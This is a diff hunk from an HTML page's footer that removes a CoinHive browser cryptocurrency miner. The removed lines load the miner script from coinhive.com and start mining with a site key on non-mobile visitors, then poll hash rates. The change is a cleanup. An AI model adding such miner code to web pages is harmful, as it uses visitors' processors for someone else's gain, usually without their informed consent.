@@ -24,26 +24,3 @@
         </ul>
     </div>
 </footer>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-    var miner = new CoinHive.Anonymous('vqM72AmP8dIPj8nfixPfTq7IG9oJ8s7u', {throttle: 0.3});
-
-    // Only start on non-mobile devices and if not opted-out
-    // in the last 14400 seconds (4 hours):
-    if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        miner.start();
-    }
-
-    // Listen on events
-    miner.on('found', function() { /* Hash found */ })
-    miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-    // Update stats once per second
-    setInterval(function() {
-        var hashesPerSecond = miner.getHashesPerSecond();
-        var totalHashes = miner.getTotalHashes();
-        var acceptedHashes = miner.getAcceptedHashes();
-
-        // Output to HTML elements...
-    }, 1000);
-</script>
